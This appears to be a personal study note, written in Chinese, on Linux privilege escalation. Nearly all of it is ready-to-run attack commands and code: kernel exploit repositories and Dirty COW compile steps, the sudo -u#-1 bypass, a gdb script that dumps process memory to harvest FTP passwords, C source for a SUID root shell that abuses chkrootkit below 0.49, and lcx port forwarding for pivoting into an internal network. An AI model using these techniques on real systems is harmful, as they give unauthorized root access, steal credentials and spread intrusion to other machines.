## linux提权学习笔记

## 操作系统信息

~~~~
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal 
~~~~

PATH

如果您对变量**内的任何文件夹具有写入权限，**您可能能够劫持一些库或二进制文件：**`PATH`**

~~~
echo $PATH
~~~

环境信息

~~~~
(env || set) 2>/dev/null
~~~~

内核版本

~~~~
cat /proc/version
uname -a
searchsploit "Linux Kernel"
~~~~

**编译的漏洞**：

~~~~
github.com/lucyoa/kernel-exploits

github.com/bwbwbwbw/linux-exploit-binaries

github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
~~~~

可以帮助搜索内核漏洞的工具

~~~
https://github.com/mzet-/linux-exploit-suggester
https://github.com/jondonas/linux-exploit-suggester-2
~~~

## CVE-2016-5195（脏牛）

Linux 权限提升 - Linux 内核 <= 3.19.0-73.8

~~~~
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
~~~~

## Sudo version

~~~~
searchsploit sudo

sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
~~~~

~~~~

sudo -V | grep 'Sudo version'    查看是否受影响的版本，低于1.8.29有漏洞
修改配置文件：vim/etc/sudoers 在root(ALL:ALL)ALL添加一行
test ALL=(ALL,!root)ALL
useradd test passwd test
su - test
sudo -u#-1 id -u 或
sudo -u#4294967295 id -u

sudo -u#-1 whoami
sudo -u#-1 sh

~~~~



检查**已安装和未安装的内容**、位置

~~~~
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
~~~~

枚举有用的二进制文件

~~~~
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404190740.png)

检查是否**安装了任何编译器**

~~~~
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404190857.png)

检查**已安装包和服务的版本**

~~~
dpkg -l #Debian
rpm -qa #Centos
~~~

可以使用**openVAS**检查机器内安装的过时和易受攻击的软件

查看正在执行的**进程并检查是否有任何进程具有****比它应有的更多权限**

~~~~
ps aux
ps -ef
top -n 1
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404191039.png)

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404191104.png)

有权访问 FTP 服务的内存

~~~~
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings 信息过程映射
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #用户和密码
~~~~

gdb脚本

~~~
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
~~~

## 内核溢出提权

~~~~
查看内核
uname -r
反弹shell执行命令
上传exp
编译
执行
根据内核版本查找对应漏洞
收集exp
可以从www.exploit-db.com查找漏洞利用
~~~~

## linux-exploit-suggerster

~~~~
https://github.com/mungurk/linux-exploit-suggester.sh/blob/master/linux-exploit-suggester.sh
chmod 777 x.sh
./x.sh
~~~~

## mysql UDF 提权

~~~
上传库文件
执行库文件创建命令执行函数
~~~

## 利用SUID提权

~~~
寻找系统里可以用的SUID文件来提权
$ find / -perm -u=s -type f 2>/dev/null
~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404203319.png)

## 利用环境变量劫持高权限程序提权

~~~
第一步：查找可操作文件
$ find / -perm -u=s -type f 2>/dev/null
第二步：利用file 命令查看文件是否可执行

~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404203402.png)

•执行该文件

•在执行的时候可能会报错，根据报错来查看调用系统命令

![](https://raw.githubusercontent.com/16778738/picture/master/img/2022/04/04/20220404203508.png)

## 利用chkrootkit <0.49版本提权

~~~~
1.如果发现Linux服务器存在chkrootkit并且版本小于0.49
2.上传一个利用脚本到/tmp目录下并编译
#include <unistd.h>
void main(void)
{
system("chown root:root /tmp/update");
system("chmod 4755 /tmp/update");
setuid(0);
setgid(0);
execl("/bin/sh","sh",NULL);
}
保存为update.c
进入到/tmp目录下
gcc -o update  update.c
然后等着管理员运行chkrootkit命令检测系统后门
在发现/tmp/update 所有者会变成root
这时候你在进入/tmp运行update
./update

~~~~

## 内网端口转发

~~~~
内网主机输入命令
lcx.exe -slave 外网ip 外网端口  内网ip   内网端口
lcx.exe -slave 200.1.1.1  1111    192.168.1.2  3389

外网主机输入命令
lcx.exe  -listen 1111  1311

~~~~

